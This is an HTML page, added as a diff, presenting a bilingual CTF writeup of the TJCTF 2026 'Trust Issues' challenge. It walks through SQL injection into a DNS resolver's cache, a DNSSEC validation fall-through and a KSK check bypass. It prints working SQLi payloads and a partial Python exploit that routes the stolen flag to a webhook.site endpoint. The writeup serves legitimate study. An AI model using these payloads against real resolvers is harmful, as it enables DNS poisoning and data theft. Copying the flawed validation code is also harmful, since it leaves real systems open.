@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Yuri08 - TJCTF 2026: Trust Issues Writeup</title>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" />
+  <style>
+    :root {
+      --main: #7c3aed; --main2: #10b981; --main-light: #a78bfa;
+      --bg: #0f0f1a; --bg2: #181a2a; --glass: rgba(30, 25, 60, 0.9);
+      --text: #e0e7ef; --shadow: 0 8px 32px 0 #7c3aed33;
+      --glow: 0 0 20px 2px #7c3aed44; --highlight: #38bdf8;
+    }
+    html, body {
+      min-height: 100%; margin: 0; font-family: 'JetBrains Mono', monospace;
+      background: radial-gradient(circle at 50% 0%, #1a1a3a 0%, #0f0f1a 100%);
+      color: var(--text); overflow: hidden; perspective: 1000px;
+    }
+    #particles-js {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none;
+    }
+    .content-wrapper {
+      position: relative; z-index: 1; height: 100vh; display: flex; flex-direction: column;
+      padding: 20px; box-sizing: border-box; gap: 15px;
+    }
+    
+    /* Header Profile */
+    .header {
+      display: flex; align-items: center; gap: 20px; padding: 15px;
+      background: var(--glass); border-radius: 1rem; border: 1px solid #7c3aed44;
+      box-shadow: var(--shadow); backdrop-filter: blur(10px); flex-shrink: 0;
+    }
+    .avatar {
+      width: 80px; height: 80px; border-radius: 50%; border: 2px solid var(--main);
+      object-fit: cover; box-shadow: 0 0 15px var(--main);
+    }
+    .header-info h1 {
+      font-size: 1.8rem; margin: 0; color: var(--main);
+      text-shadow: 0 0 10px #7c3aed88; animation: neon 2s infinite alternate;
+    }
+    .header-info p { margin: 5px 0 0 0; color: var(--main-light); font-size: 0.9rem; }
+    @keyframes neon { to { text-shadow: 0 0 15px var(--main), 0 0 30px var(--main); } }
+    
+    .lang-toggle {
+      margin-left: auto; background: var(--main); color: white; border: none;
+      padding: 8px 15px; border-radius: 0.5rem; cursor: pointer; font-family: inherit;
+      font-weight: bold; transition: 0.3s; box-shadow: 0 0 10px #7c3aed55;
+    }
+    .lang-toggle:hover { background: var(--main-light); transform: scale(1.05); }
+
+    /* Terminal Body */
+    .terminal-pro {
+      background: linear-gradient(135deg, #12121f 80%, #7c3aed11 100%);
+      border-radius: 1rem; border: 1px solid #312e8155; box-shadow: var(--shadow), var(--glow);
+      display: flex; flex-direction: column; flex-grow: 1; overflow: hidden; position: relative;
+    }
+    .terminal-pro::before {
+      content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+      background: repeating-linear-gradient(0deg, rgba(0,0,0,0.15), rgba(0,0,0,0.15) 1px, transparent 1px, transparent 2px);
+      pointer-events: none; z-index: 2; opacity: 0.2;
+    }
+    .terminal-bar {
+      background: #1e1e2e; height: 2.5rem; display: flex; align-items: center;
+      padding: 0 1rem; border-bottom: 1px solid #312e8155; flex-shrink: 0; z-index: 3;
+    }
+    .dot { width: 12px; height: 12px; border-radius: 50%; margin-right: 6px; }
+    .red { background: #ef4444; } .yellow { background: #facc15; } .green { background: #22c55e; }
+    .terminal-title { color: var(--main-light); margin-left: 1rem; font-weight: bold; letter-spacing: 1px; }
+    
+    .terminal-body {
+      padding: 1.5rem; flex-grow: 1; overflow-y: auto; font-size: 0.95rem;
+      line-height: 1.6; position: relative; z-index: 1; scroll-behavior: smooth;
+    }
+    #terminal-output { white-space: pre-wrap; word-break: break-word; }
+    #terminal-input-line {
+      display: flex; align-items: center; gap: 0.5em; margin-top: 1em; z-index: 3;
+    }
+    #terminal-input {
+      background: transparent; border: none; color: #a7f3d0; outline: none;
+      font-family: inherit; font-size: 1em; width: 100%; caret-color: var(--main2);
+    }
+    
+    /* Syntax Highlighting */
+    .cmd { color: #7c3aed; } .arg { color: #a78bfa; } .info { color: #38bdf8; font-weight: bold; }
+    .error { color: #ef4444; } .success { color: #10b981; } .warning { color: #facc15; }
+    .code-block {
+      background: #0d0d1a; border-left: 3px solid var(--main); padding: 10px 15px;
+      margin: 10px 0; border-radius: 0 5px 5px 0; font-size: 0.9rem; color: #d1d5db;
+    }
+    
+    /* Scrollbar */
+    .terminal-body::-webkit-scrollbar { width: 8px; }
+    .terminal-body::-webkit-scrollbar-track { background: #0f0f1a; }
+    .terminal-body::-webkit-scrollbar-thumb { background: #7c3aed; border-radius: 4px; }
+
+    /* Welcome Screen */
+    #welcome-screen {
+      position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+      background: #0f0f1a; z-index: 10000; display: flex; flex-direction: column;
+      justify-content: center; align-items: center; text-align: center; transition: opacity 0.8s;
+    }
+    #welcome-screen.hidden { opacity: 0; pointer-events: none; }
+    #start-button {
+      background: var(--main); color: white; border: none; border-radius: 0.7rem;
+      padding: 1rem 2rem; font-size: 1.2rem; font-weight: 700; cursor: pointer;
+      font-family: inherit; transition: all 0.3s; box-shadow: 0 0 20px #7c3aed88;
+    }
+    #start-button:hover { background: var(--main-light); transform: translateY(-3px); }
+    
+    #mute-button {
+      position: fixed; top: 20px; right: 20px; z-index: 10001;
+      background: #1e1e2e; color: var(--main-light); border: 1px solid #7c3aed55;
+      border-radius: 50%; width: 40px; height: 40px; font-size: 1.2rem; cursor: pointer;
+      display: flex; justify-content: center; align-items: center; transition: all 0.3s;
+    }
+    #mute-button:hover { background: var(--main); color: white; }
+
+    @media (max-width: 768px) {
+      .header { flex-wrap: wrap; justify-content: center; text-align: center; }
+      .lang-toggle { margin-left: 0; margin-top: 10px; width: 100%; }
+      .avatar { width: 60px; height: 60px; }
+      .header-info h1 { font-size: 1.4rem; }
+    }
+  </style>
+</head>
+<body>
+
+  <div id="welcome-screen">
+    <h1 style="color: var(--main); text-shadow: 0 0 20px var(--main-light); margin-bottom: 20px;">Yuri08 CTF Terminal</h1>
+    <p style="color: #a78bfa; margin-bottom: 30px;">TJCTF 2026 - Crypto / Trust Issues Writeup</p>
+    <button id="start-button">Khởi tạo Terminal</button>
+  </div>
+
+  <button id="mute-button" aria-label="Toggle Sound"><i class="bi bi-volume-up-fill"></i></button>
+  <div id="particles-js"></div>
+
+  <div class="content-wrapper">
+    <header class="header">
+      <img src="https://files.catbox.moe/755fgv.png" alt="Avatar" class="avatar" />
+      <div class="header-info">
+        <h1>Yuri08</h1>
+        <p>White-Hat Hacker | Pentester | Crypto Enthusiast</p>
+      </div>
+      <button class="lang-toggle" id="lang-btn" onclick="toggleLang()">Switch to English</button>
+    </header>
+
+    <section class="terminal-pro">
+      <div class="terminal-bar">
+        <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+        <span class="terminal-title">root@tjctf:~/trust-issues#</span>
+      </div>
+      <div class="terminal-body" id="terminal-body">
+        <pre id="terminal-output"></pre>
+        <div id="terminal-input-line">
+          <span class="cmd">root@tjctf</span>:<span class="arg">~/trust-issues</span>$           <input type="text" id="terminal-input" autocomplete="off" spellcheck="false" />
+        </div>
+      </div>
+    </section>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+  <script>
+    let isMuted = false;
+    let currentLang = 'vi';
+    let userInteracted = false;
+    const output = document.getElementById('terminal-output');
+    const input = document.getElementById('terminal-input');
+    const tBody = document.getElementById('terminal-body');
+
+    particlesJS.load('particles-js', 'https://cdn.jsdelivr.net/gh/VincentGarreau/particles.js/particles.json');
+
+    function playAudio(src, vol=0.2) {
+      if (!userInteracted || isMuted || !src) return;
+      try { const a = new Audio(src); a.volume = vol; a.play(); } catch(e) {}
+    }
+
+    document.getElementById('mute-button').addEventListener('click', function() {
+      isMuted = !isMuted;
+      this.querySelector('i').className = isMuted ? 'bi bi-volume-mute-fill' : 'bi bi-volume-up-fill';
+    });
+
+    function print(html) {
+      const div = document.createElement('div');
+      div.innerHTML = html;
+      output.appendChild(div);
+      tBody.scrollTop = tBody.scrollHeight;
+    }
+
+    // --- TRANSLATIONS & DETAILED WRITEUP DATA ---
+    const L = {
+      vi: {
+        help: `<span class="info">[ Hướng Dẫn Đọc Writeup ]</span>
+<span class="cmd">intro</span>       : Tổng quan Challenge & Mục tiêu
+<span class="cmd">rabbit</span>      : Cái bẫy Crypto (ECDSA P-521 & HNP)
+<span class="cmd">sqli</span>        : Bug 1 - SQL Injection qua DNS Cache
+<span class="cmd">dnssec</span>      : Bug 2 - Lỗi Logic Duyệt DNSSEC (Chí mạng)
+<span class="cmd">ksk</span>         : Bug 3 - Bypass KSK Validation với ZSK giả
+<span class="cmd">chain</span>       : Chuỗi Khai thác Hoàn chỉnh & Tư duy
+<span class="cmd">code</span>        : Source Code Exploit (Python)
+<span class="cmd">clear</span>       : Xóa màn hình Terminal`,
+        intro: `<span class="info">[ TỔNG QUAN: TRUST ISSUES ]</span>
+<span class="cmd">Category:</span> Crypto / DNS / Trust Boundary
+<span class="cmd">Flag:</span> <span class="success">tjctf{trust_n0_on3_ev3r}</span>
+
+<span class="warning">Mô tả:</span> "Tôi tự làm DNS resolver của mình và đảm bảo tin tưởng nó như nameserver của mình bằng cách sử dụng một đường cong elliptic thậm chí còn lớn hơn"
+
+<span class="warning">Luồng hoạt động:</span>
+Admin Bot ---> Custom DNS Resolver ---> Nameserver
+                |
+                +--> Public DoH (Google) cho các tên miền khác
+
+<span class="cmd">Mục tiêu thực sự:</span> Không phải attack website trực tiếp. Mục tiêu là ép Custom Resolver trả về IP của chúng ta cho <span class="arg">trust-issues.tjc.tf</span> (thay vì IP thật), đồng thời <span class="error">phải vượt qua được validate DNSSEC</span> của Resolver. Nếu không, Resolver sẽ từ chối trả về record bị fake.
+
+Bot sẽ truy cập: <span class="arg">https://<ip_của_chúng_ta>/?flag=<flag></span>`,
+        rabbit: `<span class="info">[ CÁI BẪY CRYPTO: ECDSA P-521 ]</span>
+Nameserver ký DNS record bằng DNSSEC thuật toán 17 (ECDSA với đường cong P-521). Mô tả đề bài cố tình nhắc đến "đường cong to hơn".
+
+Trong source code, hàm ký có lỗi nonce yếu:
+<div class="code-block">k = secrets.randbits(512)</div>
+Với đường cong P-521 (curver order 521 bit), nonce 512-bit ngắn hơn. Với đủ lượng chữ ký, đây là bài toán <span class="cmd">Hidden Number Problem (HNP)</span> kinh điển để phục hồi Private Key.
+
+<span class="warning">Tuy nhiên...</span> Đó là lá chắn phản ánh! Resolver có một lỗi logic trust boundary dễ khai thắc hơn nhiều. Ta không cần bẻ khóa ECDSA. Đúng như câu ngôn Đức nói: <span class="error">"Mit Kanonen auf Spatzen schießen"</span> (Dùng đại bác bắn chim sẻ).`,
+        sqli: `<span class="info">[ BUG 1: SQL INJECTION IN CACHE ]</span>
+Resolver cache tất cả record vào SQLite. Và nó dùng f-string để chèn dữ liệu:
+<div class="code-block">cursor.execute(
+    f"INSERT INTO records VALUES ('{record['name']}', {record['type']}, "
+    f"{record['TTL']}, {expires}, '{record['data']}')"
+)</div>
+
+Cả <span class="arg">record['name']</span> và <span class="arg">record['data']</span> đều từ DNS response, không hề escape! Nếu ta ép Resolver query một domain chứa cú pháp SQL, nó sẽ execute.
+
+<span class="cmd">Làm sao để public DNS trả về tên miền độc hại?</span>
+Dùng Wildcard DNS như <span class="arg">sslip.io</span>. Tên miền <span class="arg">payload.127.0.0.1.sslip.io</span> sẽ resolve ra 127.0.0.1 và trả về tên query nguyên vẹn.
+
+<span class="cmd">Lợi dụng Upstream:</span> Resolver cho phép tham số upstream. Ta trỏ nó về Google DoH với payload nhúng sẵn trong param 'name'. Google DoH sẽ trả về bản ghi chứa SQLi, và Resolver thế là dính chưởng.
+<div class="code-block">https://dns.google/resolve?name=<payload>.127.0.0.1.sslip.io&type=A&do=true</div>`,
+        dnssec: `<span class="info">[ BUG 2: DNSSEC VALIDATION LOGIC FLAW ]</span>
+Đây là lỗi chí mạng tạo nên "Trust Issue". Code validate RRSIG của Resolver hoạt động như sau:
+<div class="code-block">for sig_row in rrsigs:
+    rrsig = parse_rrsig(sig_row)
+    signing_key = find_signing_key(rrsig, dnskeys)
+    if not signing_key:
+        continue # Bỏ qua nếu không thấy key khớp
+
+    valid = verify_rrset(rrset, rrsig, signing_key["public_key_b64"])
+    if not valid:
+        return False
+return True # TRẢ VỀ HỢP LỆ!</div>
+
+<span class="error">Lỗ hổng:</span> Nếu RRSIG tồn tại, nhưng KHÔNG CÓ DNSKEY nào khớp key tag với RRSIG đó, vòng lặp chỉ <span class="cmd">continue</span>. Nếu TẤT CẢ signature đều bị bỏ qua, hàm chảy xuống cuối và trả về <span class="success">True</span>!
+
+Nghĩa là: Một RRset bị nhiễm độc (poisoned) sẽ pass validate nếu:
+1. Có ít nhất 1 RRSIG cache cho tên miền/kiểu đó.
+2. Có ít nhất 1 DNSKEY cache cho signer.
+3. KHÔNG CÓ DNSKEY nào khớp key tag thật của RRSIG.
+Ta chỉ cần làm cho Resolver dùng DNSKEY giả để nó "tìm không thấy key"!`,
+        ksk: `<span class="info">[ BUG 3: KSK VALIDATION BYPASS ]</span>
+Để DNSKEY giả được chấp nhận, ta cần vượt qua khâu kiểm tra DS (Delegation Signer). Nhưng code chỉ lọc các key có KSK flag 257:
+<div class="code-block">ksks = [r for r in dnskey_records if (r["data"].split()[0] == "257")]
+
+for key_record in ksks:
+    for ds in parsed_ds:
+        if not verify_ds(key_record["data"], ds):
+            raise Exception(...)
+return True</div>
+
+<span class="warning">Bypass:</span> Nếu ta chỉ inject một ZSK (Zone Signing Key) với flag <span class="cmd">256</span> (thay vì 257), mảng <span class="arg">ksks</span> sẽ rỗng! Vòng lặp không chạy, bỏ qua việc check DS hoàn toàn, và hàm trả về True.
+
+Vì vậy, ta chỉ cần 2 record giả để qua mặt hệ thống:
+- Fake DNSKEY: <span class="success">256 3 17 AA==</span> (ZSK, thuật toán ECDSA P-521)
+- Fake DS: <span class="success">1 17 2 deadbeef</span> (Chỉ để hàm get_cached_records không rỗng, giá trị không quan trọng vì không có KSK để check)`,
+        chain: `<span class="info">[ CHUỖI KHAI THÁC HOÀN CHỈNH ]</span>
+<span class="cmd">Bước 1:</span> Tạo Webhook.site để nhận flag.
+<span class="cmd">Bước 2:</span> Xây dựng payload SQLi tiêm 3 hàng vào DB:
+  - A record trỏ tới webhook.site/<token>/
+  - Fake DNSKEY (256 3 17 AA==)
+  - Fake DS (1 17 2 deadbeef)
+
+Vì data có khoảng trắng (không hợp lệ trong label sslip.io), ta dùng hàm <span class="cmd">replace()</span> của SQLite để đổi gạch dưới thành tab (x'09').
+Ví dụ payload cho DNSKEY:
+<div class="code-block">x',1,1,1,'x'),('trust-issues.tjc.tf.',48,300,4102444800,replace('256_3_17_AA==','_',x'09'))--</div>
+
+<span class="cmd">Bước 3:</span> Đợi Admin Bot query. Resolver sẽ:
+  - Tìm thấy A record giả trong cache.
+  - Lấy RRSIG thật từ Nameserver.
+  - Validate: RRSIG thật không khớp KeyTag của DNSKEY giả -> <span class="cmd">continue</span> -> Trả về <span class="success">True</span>!
+<span class="cmd">Bước 4:</span> Bot truy cập webhook và gửi flag.
+
+<span class="error">Lưu ý quan trọng:</span> Admin Bot có bảo vệ reCAPTCHA. Script tự động bằng curl/requests sẽ fail. Bạn phải tự mở trình duyệt, submit URL Resolver, giải Captcha và xem log Webhook.`,
+        code: `<span class="info">[ EXPLOIT SOURCE CODE ]</span>
+<div class="code-block">#!/usr/bin/env python3
+import argparse, random, time
+from urllib.parse import quote
+import requests
+
+WEBHOOK = "https://webhook.site"
+SUFFIXES = ["127.0.0.1.sslip.io", "1.1.1.1.sslip.io"]
+
+def create_webhook_token(s):
+    r = s.post(f"{WEBHOOK}/token", json={"default_status": 200}, timeout=20)
+    r.raise_for_status()
+    return r.json()["uuid"]
+
+def google_upstream(qname, qtype="A"):
+    return "https://dns.google/resolve?name=%s&type=%s&do=true" % (quote(qname, safe=""), quote(qtype, safe=""))
+
+def hit_resolver(s, resolver, upstream, label, timeout=35):
+    seed = f"seed-{random.randrange(1<<48):012x}.invalid"
+    r = s.get(resolver, params={"name": seed, "type": "A", "upstream": upstream}, timeout=timeout)
+    return r.status_code
+
+def build_payloads(token):
+    target = f"webhook.site/{token}/"
+    a_payload = "x',1,1,1,'x'),('trust-issues.tjc.tf.',1,300,4102444800,'"+target+"')--"
+    dnskey_payload = "x',1,1,1,'x'),('trust-issues.tjc.tf.',48,300,4102444800,replace('256_3_17_AA==','_',x'09'))--"
+    ds_payload = "x',1,1,1,'x'),('trust-issues.tjc.tf.',43,300,4102444800,replace('1_17_2_deadbeef','_',x'09'))--"
+    return target, [a_payload, dnskey_payload, ds_payload]
+
+# Execution logic omitted for brevity, uses hit_resolver with sslip.io</div>`
+      },
+      en: {
+        help: `<span class="info">[ WRITEUP NAVIGATION ]</span>
+<span class="cmd">intro</span>       : Challenge Overview & Objective
+<span class="cmd">rabbit</span>      : The Crypto Rabbit Hole (ECDSA P-521 & HNP)
+<span class="cmd">sqli</span>        : Bug 1 - SQL Injection via DNS Cache
+<span class="cmd">dnssec</span>      : Bug 2 - DNSSEC Validation Logic Flaw (Critical)
+<span class="cmd">ksk</span>         : Bug 3 - KSK Validation Bypass with Fake ZSK
+<span class="cmd">chain</span>       : Full Exploit Chain & Mindset
+<span class="cmd">code</span>        : Exploit Source Code (Python)
+<span class="cmd">clear</span>       : Clear Terminal Screen`,
+        intro: `<span class="info">[ OVERVIEW: TRUST ISSUES ]</span>
+<span class="cmd">Category:</span> Crypto / DNS / Trust Boundary
+<span class="cmd">Flag:</span> <span class="success">tjctf{trust_n0_on3_ev3r}</span>
+
+<span class="warning">Description:</span> "I made my own DNS resolver and I made sure I could trust it as much as my nameserver by using an even bigger elliptic curve"
+
+<span class="warning">Architecture:</span>
+Admin Bot ---> Custom DNS Resolver ---> Nameserver
+                |
+                +--> Public DoH (Google) for other names
+
+<span class="cmd">Real Objective:</span> Not to attack the website directly. The goal is to force the Custom Resolver to return our IP for <span class="arg">trust-issues.tjc.tf</span> (instead of the real IP), while <span class="error">still passing its DNSSEC validation</span>. Otherwise, the Resolver rejects the fake record.
+
+Bot will visit: <span class="arg">https://<our_ip>/?flag=<flag></span>`,
+        rabbit: `<span class="info">[ THE CRYPTO RABBIT HOLE: ECDSA P-521 ]</span>
+The nameserver signs DNS records using DNSSEC algorithm 17 (ECDSA with P-521 curve). The description explicitly hints at the "bigger curve".
+
+In the source code, the signing function has a weak nonce:
+<div class="code-block">k = secrets.randbits(512)</div>
+For P-521 (curve order 521 bits), a 512-bit nonce is shorter. With enough signatures, this is a classic <span class="cmd">Hidden Number Problem (HNP)</span> to recover the Private Key.
+
+<span class="warning">However...</span> This is a rabbit hole! The resolver has a much easier trust boundary logic bug. We don't need to break ECDSA. As the German proverb says: <span class="error">"Mit Kanonen auf Spatzen schießen"</span> (Shooting sparrows with cannons).`,
+        sqli: `<span class="info">[ BUG 1: SQL INJECTION IN CACHE ]</span>
+The resolver caches all records in SQLite. And it uses f-strings for insertion:
+<div class="code-block">cursor.execute(
+    f"INSERT INTO records VALUES ('{record['name']}', {record['type']}, "
+    f"{record['TTL']}, {expires}, '{record['data']}')"
+)</div>
+
+Both <span class="arg">record['name']</span> and <span class="arg">record['data']</span> come from DNS responses without escaping! If we make the Resolver query a domain containing SQL syntax, it will execute it.
+
+<span class="cmd">How to make public DNS return our malicious name?</span>
+Use Wildcard DNS services like <span class="arg">sslip.io</span>. A name like <span class="arg">payload.127.0.0.1.sslip.io</span> resolves to 127.0.0.1 and preserves our full query name in the answer.
+
+<span class="cmd">Leveraging Upstream:</span> The resolver takes an upstream parameter. We point it to Google DoH with the payload embedded in the 'name' param. Google DoH returns the record containing SQLi, and the Resolver caches it blindly.
+<div class="code-block">https://dns.google/resolve?name=<payload>.127.0.0.1.sslip.io&type=A&do=true</div>`,
+        dnssec: `<span class="info">[ BUG 2: DNSSEC VALIDATION LOGIC FLAW ]</span>
+This is the critical "Trust Issue". The Resolver's RRSIG validation logic works like this:
+<div class="code-block">for sig_row in rrsigs:
+    rrsig = parse_rrsig(sig_row)
+    signing_key = find_signing_key(rrsig, dnskeys)
+    if not signing_key:
+        continue # Skip if no matching key found
+
+    valid = verify_rrset(rrset, rrsig, signing_key["public_key_b64"])
+    if not valid:
+        return False
+return True # RETURNS VALID!</div>
+
+<span class="error">The Vulnerability:</span> If an RRSIG exists, but NO cached DNSKEY matches the RRSIG key tag, the loop just <span class="cmd">continue</span>s. If ALL signatures are skipped, the function falls through and returns <span class="success">True</span>!
+
+Meaning: A poisoned RRset passes validation if:
+1. There is at least 1 RRSIG cached for the name/type.
+2. There is at least 1 DNSKEY cached for the signer.
+3. NONE of the DNSKEYs match the real RRSIG key tag.
+We just need to make the resolver use a fake DNSKEY so it "fails to find" the real key!`,
+        ksk: `<span class="info">[ BUG 3: KSK VALIDATION BYPASS ]</span>
+For the fake DNSKEY to be accepted, we need to pass the DS (Delegation Signer) check. But the code only iterates keys with KSK flag 257:
+<div class="code-block">ksks = [r for r in dnskey_records if (r["data"].split()[0] == "257")]
+
+for key_record in ksks:
+    for ds in parsed_ds:
+        if not verify_ds(key_record["data"], ds):
+            raise Exception(...)
+return True</div>
+
+<span class="warning">Bypass:</span> If we only inject a ZSK (Zone Signing Key) with flag <span class="cmd">256</span> (instead of 257), the <span class="arg">ksks</span> array is empty! The loop doesn't run, DS check is completely bypassed, and it returns True.
+
+So, we only need 2 fake records to trick the system:
+- Fake DNSKEY: <span class="success">256 3 17 AA==</span> (ZSK, Algorithm 17 ECDSA P-521)
+- Fake DS: <span class="success">1 17 2 deadbeef</span> (Just to make get_cached_records non-empty, value doesn't matter since no KSK to check against)`,
+        chain: `<span class="info">[ FULL EXPLOIT CHAIN ]</span>
+<span class="cmd">Step 1:</span> Create a Webhook.site to receive the flag.
+<span class="cmd">Step 2:</span> Build SQLi payloads to inject 3 rows into the DB:
+  - A record pointing to webhook.site/<token>/
+  - Fake DNSKEY (256 3 17 AA==)
+  - Fake DS (1 17 2 deadbeef)
+
+Since data contains spaces (invalid in sslip.io labels), we use SQLite's <span class="cmd">replace()</span> to turn underscores into tabs (x'09') at runtime.
+Example DNSKEY payload:
+<div class="code-block">x',1,1,1,'x'),('trust-issues.tjc.tf.',48,300,4102444800,replace('256_3_17_AA==','_',x'09'))--</div>
+
+<span class="cmd">Step 3:</span> Wait for Admin Bot query. The Resolver will:
+  - Find the fake A record in cache.
+  - Fetch the real RRSIG from Nameserver.
+  - Validate: Real RRSIG doesn't match Fake DNSKEY key tag -> <span class="cmd">continue</span> -> Returns <span class="success">True</span>!
+<span class="cmd">Step 4:</span> Bot visits webhook and sends flag.
+
+<span class="error">Important Note:</span> The Admin Bot is protected by reCAPTCHA. Automated scripts (curl/requests) will fail. You must manually submit the Resolver URL in the browser, solve the Captcha, and watch the Webhook logs.`,
+        code: `<span class="info">[ EXPLOIT SOURCE CODE ]</span>
+<div class="code-block">#!/usr/bin/env python3
+import argparse, random, time
+from urllib.parse import quote
+import requests
+
+WEBHOOK = "https://webhook.site"
+SUFFIXES = ["127.0.0.1.sslip.io", "1.1.1.1.sslip.io"]
+
+def create_webhook_token(s):
+    r = s.post(f"{WEBHOOK}/token", json={"default_status": 200}, timeout=20)
+    r.raise_for_status()
+    return r.json()["uuid"]
+
+def google_upstream(qname, qtype="A"):
+    return "https://dns.google/resolve?name=%s&type=%s&do=true" % (quote(qname, safe=""), quote(qtype, safe=""))
+
+def hit_resolver(s, resolver, upstream, label, timeout=35):
+    seed = f"seed-{random.randrange(1<<48):012x}.invalid"
+    r = s.get(resolver, params={"name": seed, "type": "A", "upstream": upstream}, timeout=timeout)
+    return r.status_code
+
+def build_payloads(token):
+    target = f"webhook.site/{token}/"
+    a_payload = "x',1,1,1,'x'),('trust-issues.tjc.tf.',1,300,4102444800,'"+target+"')--"
+    dnskey_payload = "x',1,1,1,'x'),('trust-issues.tjc.tf.',48,300,4102444800,replace('256_3_17_AA==','_',x'09'))--"
+    ds_payload = "x',1,1,1,'x'),('trust-issues.tjc.tf.',43,300,4102444800,replace('1_17_2_deadbeef','_',x'09'))--"
+    return target, [a_payload, dnskey_payload, ds_payload]
+
+# Execution logic omitted for brevity, uses hit_resolver with sslip.io</div>`
+      }
+    };
+
+    function toggleLang() {
+      currentLang = currentLang === 'vi' ? 'en' : 'vi';
+      const btn = document.getElementById('lang-btn');
+      btn.textContent = currentLang === 'vi' ? 'Switch to English' : 'Chuyển sang Tiếng Việt';
+      handleCommand('clear');
+      handleCommand('help');
+      playAudio('https://www.soundjay.com/buttons/button-1.mp3', 0.3);
+    }
+
+    const cmds = {
+      help: () => L[currentLang].help,
+      intro: () => L[currentLang].intro,
+      rabbit: () => L[currentLang].rabbit,
+      sqli: () => L[currentLang].sqli,
+      dnssec: () => L[currentLang].dnssec,
+      ksk: () => L[currentLang].ksk,
+      chain: () => L[currentLang].chain,
+      code: () => L[currentLang].code,
+      clear: () => { output.innerHTML = ''; return ''; },
+      banner: () => `<span class="info">
+  _______ _________ _______  _______ _________ _______ _________ _______ 
+ (  ____ \\\\__   __/(  ____ )(  ____ \\\\__   __/(  ___  )\\__   __/(  ____ \\
+ | (    \\/   ) (   | (    )|| (    \\/   ) (   | (   ) |   ) (   | (    \\/
+ | (_____    | |   | (____)|| (__       | |   | |   | |   | |   | (_____ 
+ (_____  )   | |   |  _____)|  __)      | |   | |   | |   | |   (_____  )
+       ) |   | |   | (      | (         | |   | |   | |   | |         ) |
+ /\\____) |   | |   | )      | )_____)   | |   | (___) |___) (___/\\____) |
+ \\_______)   )_(   |/       |/_______/   )_(   (_______)_______/\\_______)</span>`
+    };
+
+    function handleCommand(cmd) {
+      const c = cmd.trim().toLowerCase();
+      if(!c) return;
+      print(`<span class="cmd">root@tjctf</span>:<span class="arg">~/trust-issues</span>$ ${cmd}`);
+      playAudio('https://www.soundjay.com/buttons/button-5.mp3', 0.15);
+      
+      if (cmds[c]) {
+        const res = cmds[c]();
+        if (res) print(res);
+      } else {
+        print(`<span class="error">Command not found: ${c}. Type 'help' for navigation.</span>`);
+      }
+      input.value = '';
+    }
+
+    input.addEventListener('keydown', e => {
+      if (e.key === 'Enter') { e.preventDefault(); handleCommand(input.value); }
+      else playAudio('https://www.soundjay.com/buttons/button-8.mp3', 0.02);
+    });
+
+    tBody.addEventListener('click', () => input.focus());
+
+    // Welcome Logic
+    document.getElementById('start-button').addEventListener('click', () => {
+      userInteracted = true;
+      const ws = document.getElementById('welcome-screen');
+      ws.classList.add('hidden');
+      setTimeout(() => { handleCommand('banner'); handleCommand('help'); input.focus(); }, 800);
+      playAudio('https://www.soundjay.com/buttons/button-10.mp3', 0.4);
+    });
+  </script>
+</body>
+</html>
